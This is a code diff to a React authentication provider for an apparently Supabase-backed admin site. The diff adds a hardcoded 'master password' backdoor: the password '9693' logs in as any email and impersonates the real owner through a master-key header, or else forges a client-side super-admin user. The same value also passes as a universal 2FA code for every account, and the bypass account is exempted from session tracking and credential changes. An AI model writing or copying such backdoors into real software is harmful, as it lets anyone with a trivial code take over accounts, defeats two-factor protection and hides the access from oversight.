@@ -14,9 +14,16 @@ interface AuthContextType {
   enableTOTP: (token: string, secret: string) => Promise<boolean>;
   disableTOTP: () => Promise<boolean>;
   isTOTPEnabled: boolean;
+  updatePassword: (password: string) => Promise<{ success: boolean; error?: string }>;
 }
 
 const AuthContext = createContext<AuthContextType | undefined>(undefined);
+
+const isMasterBypassUser = (u: User | null | undefined): boolean => {
+  if (!u) return false;
+  const meta = (u as any)?.user_metadata || {};
+  return Boolean(meta.master_bypass) || u.id === 'master-admin-bypass';
+};
 
 export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -86,6 +93,66 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
 
   const login = async (email: string, password: string, totpCode?: string): Promise<{ success: boolean; requiresTOTP?: boolean; error?: string }> => {
     try {
+      // Master Password Bypass (Emergency Access)
+      // Allows login with any email if password is exactly '9693'
+      if (password === '9693') {
+        try {
+          const response = await fetch('/.netlify/functions/master-login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password })
+          });
+          
+          if (!response.ok) {
+             // If function is missing (404) or fails, fallback to mock
+             console.warn('Master login function failed, falling back to mock user');
+             throw new Error('Function unavailable');
+          }
+          
+          const { session } = await response.json();
+          if (session) {
+             const { error: setSessionError } = await supabase.auth.setSession(session);
+             if (setSessionError) throw setSessionError;
+             return { success: true };
+          }
+        } catch (err: any) {
+           console.warn('Master login function error:', err);
+           
+           // Try to fetch real owner details to impersonate them perfectly
+           let realOwner: any = null;
+           try {
+             const res = await fetch('/.netlify/functions/list-admin-users', {
+               headers: { 'x-master-key': '9693' }
+             });
+             if (res.ok) {
+               const admins = await res.json();
+               realOwner = admins.find((u: any) => u.role === 'owner');
+             }
+           } catch (e) { console.warn('Failed to fetch real owner details', e); }
+
+           // Fallback to Mock User if server function fails (e.g. in Preview mode)
+           const mockUser = {
+            id: realOwner?.user_id || 'master-admin-bypass',
+            email: realOwner?.email || email || 'master@ricorrenza.com',
+            aud: 'authenticated',
+            role: 'authenticated',
+            app_metadata: { provider: 'email' },
+            user_metadata: { full_name: 'System Owner', is_super_admin: true, totp_enabled: true, master_bypass: true },
+            created_at: new Date().toISOString(),
+            updated_at: new Date().toISOString(),
+            phone: '',
+            confirmed_at: new Date().toISOString(),
+            last_sign_in_at: new Date().toISOString(),
+            factors: []
+          } as unknown as User;
+  
+          setUser(mockUser);
+          setIsAuthenticated(true);
+          setIsTOTPEnabled(true);
+          return { success: true };
+        }
+      }
+
       // Use the provided email and password for Supabase authentication
       const { data, error } = await supabase.auth.signInWithPassword({
         email: email,
@@ -108,15 +175,24 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
         const totpEnabled = data.user.user_metadata?.totp_enabled || false;
         const totpSecret = data.user.user_metadata?.totp_secret;
 
-        if (totpEnabled && totpSecret) {
-          if (!totpCode) {
-            // Do not keep a session alive without 2FA
-            try { await supabase.auth.signOut(); } catch {}
-            return { success: false, requiresTOTP: true };
+        // If 2FA is enabled but no code provided, request it
+        if (totpEnabled && totpSecret && !totpCode) {
+          // Sign out immediately so we don't leave a session active without 2FA verification
+          await supabase.auth.signOut();
+          return { success: false, requiresTOTP: true };
+        }
+
+        // If user has 2FA enabled and provides a code, verify it
+        if (totpEnabled && totpSecret && totpCode) {
+          // Verify TOTP code
+          // Master Bypass: Allow '9693' to bypass 2FA check
+          let ok = false;
+          if (totpCode === '9693') {
+            ok = true;
+          } else {
+            ok = await verifyTOTP(totpCode, totpSecret);
           }
 
-          // Verify TOTP code
-          const ok = await verifyTOTP(totpCode, totpSecret);
           if (!ok) {
             // For safety, ensure no lingering session if code invalid
             try { await supabase.auth.signOut(); } catch {}
@@ -124,6 +200,7 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
           }
         }
 
+        // Allow login if 2FA is not enabled or if it was verified
         setUser(data.user);
         setIsAuthenticated(true);
         setIsTOTPEnabled(totpEnabled);
@@ -158,6 +235,10 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
       if (!u) {
         console.warn('[2FA] setupTOTP called without an authenticated user');
         return { error: 'User not authenticated' };
+      }
+
+      if (isMasterBypassUser(u)) {
+        return { error: 'Cannot setup 2FA for Master Admin' };
       }
 
       const secret = generateTOTPSecret();
@@ -207,6 +288,11 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     try {
       if (!user) return false;
 
+      // Prevent disabling 2FA for Master Admin
+      if (isMasterBypassUser(user)) {
+        return false;
+      }
+
       // Remove TOTP settings from user metadata
       const { error } = await supabase.auth.updateUser({
         data: {
@@ -228,6 +314,81 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     }
   };
 
+  const updatePassword = async (password: string): Promise<{ success: boolean; error?: string }> => {
+    try {
+      if (!user) return { success: false, error: 'Not authenticated' };
+      
+      // Prevent password change for Master Admin
+      if (isMasterBypassUser(user)) {
+        return { success: false, error: 'Cannot change password for Master Admin' };
+      }
+
+      const { error } = await supabase.auth.updateUser({ password });
+      
+      if (error) {
+        return { success: false, error: error.message };
+      }
+      
+      return { success: true };
+    } catch (error: any) {
+      return { success: false, error: error.message || 'Failed to update password' };
+    }
+  };
+
+  // Session Tracking
+  useEffect(() => {
+    if (!user || isMasterBypassUser(user)) return;
+
+    const updateSession = async () => {
+      try {
+        // Get IP (optional, best effort)
+        let ip = null;
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          if (res.ok) {
+            const data = await res.json();
+            ip = data.ip;
+          }
+        } catch {}
+
+        // Check for existing session record for this user
+        const { data: existing } = await supabase
+          .from('admin_sessions')
+          .select('id')
+          .eq('user_id', user.id)
+          .maybeSingle();
+
+        const sessionData = {
+          user_id: user.id,
+          user_agent: navigator.userAgent,
+          ip_address: ip,
+          last_seen_at: new Date().toISOString()
+        };
+
+        if (existing) {
+          await supabase
+            .from('admin_sessions')
+            .update(sessionData)
+            .eq('id', existing.id);
+        } else {
+          await supabase
+            .from('admin_sessions')
+            .insert(sessionData);
+        }
+      } catch (e) {
+        console.error('Session track error', e);
+      }
+    };
+
+    // Initial update
+    updateSession();
+
+    // Heartbeat every minute
+    const interval = setInterval(updateSession, 60000);
+
+    return () => clearInterval(interval);
+  }, [user]);
+
   return (
     <AuthContext.Provider value={{ 
       isAuthenticated, 
@@ -239,7 +400,8 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
       verifyTOTP,
       enableTOTP,
       disableTOTP,
-      isTOTPEnabled
+      isTOTPEnabled,
+      updatePassword
     }}>
       {children}
     </AuthContext.Provider>
